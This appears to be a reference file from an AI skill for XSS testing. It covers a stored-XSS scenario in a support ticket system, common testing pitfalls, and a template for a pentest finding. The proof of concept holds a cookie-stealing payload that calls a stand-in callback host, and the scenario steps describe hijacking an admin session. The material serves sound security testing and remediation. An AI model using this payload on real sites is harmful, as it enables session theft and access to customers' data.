# testing-for-xss-vulnerabilities — 详细参考（由 SKILL.md 拆分）

### Scenario: Stored XSS in Customer Support Ticket System

**Context**: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.

**Approach**:
1. Submit a support ticket with a unique XSS Hunter payload in the ticket description
2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot
3. Use the captured admin session cookie to access the admin panel as the support agent
4. From the admin panel, access customer records, order data, and refund functionality
5. Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised
6. Test if CSP would have prevented the attack (in this case, no CSP header was present)

**Pitfalls**:
- Only testing for `<script>alert(1)</script>` and missing XSS that fires through event handlers or in non-HTML contexts
- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)
- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable
- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards

## Output Format

```
## Finding: Stored XSS in Support Ticket Description

**ID**: XSS-002
**Severity**: High (CVSS 8.1)
**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
**Parameter**: description (POST body)
**XSS Type**: Stored (persistent)

**Description**:
The support ticket description field does not sanitize HTML input before storing
it in the database. When a support agent views the ticket in the admin panel, the
unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
execution in the context of the admin application.

**Proof of Concept**:
Submitted ticket with payload:
<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">

The payload fired when the agent viewed the ticket, exfiltrating the admin session
cookie to the XSS Hunter server.

**Impact**:
An attacker can steal the session tokens of support agents and administrators,
gaining access to the admin panel with privileges to view customer PII, process
refunds, and modify orders. Affects all 23 support agents who view customer tickets.

**Remediation**:
1. Implement output encoding using a context-aware library (OWASP Java Encoder,
   DOMPurify for client-side rendering)
2. Deploy Content Security Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
3. Set HttpOnly flag on session cookies to prevent JavaScript access
4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
```
